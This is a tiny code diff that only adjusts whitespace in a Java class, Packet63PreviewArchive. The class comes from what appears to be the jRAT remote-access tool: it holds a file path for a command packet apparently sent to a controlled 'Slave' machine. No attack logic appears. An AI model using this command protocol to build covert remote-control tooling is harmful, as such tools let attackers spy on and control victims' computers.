@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet63PreviewArchive extends AbstractOutgoingPacket {
 
 	private String file;
-	
+
 	public Packet63PreviewArchive(String file) {
 		this.file = file;
 	}
